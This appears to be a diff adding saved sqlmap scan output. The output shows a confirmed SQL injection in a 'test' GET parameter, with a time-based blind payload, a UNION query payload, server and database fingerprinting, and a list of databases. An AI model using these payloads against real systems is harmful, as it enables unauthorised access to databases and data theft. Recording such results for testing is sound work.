@@ -1,0 +1,18 @@
+sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
+---
+Parameter: test (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: test=query' AND (SELECT 3067 FROM (SELECT(SLEEP(5)))lojm) AND 'Sqle'='Sqle
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: test=query' UNION ALL SELECT NULL,CONCAT(0x7162717671,0x5553624e576a41624f7a79424a7962505768415152516953496e6341527359526e696c6861635941,0x71707a7671),NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] acuart
+[*] information_schema
+
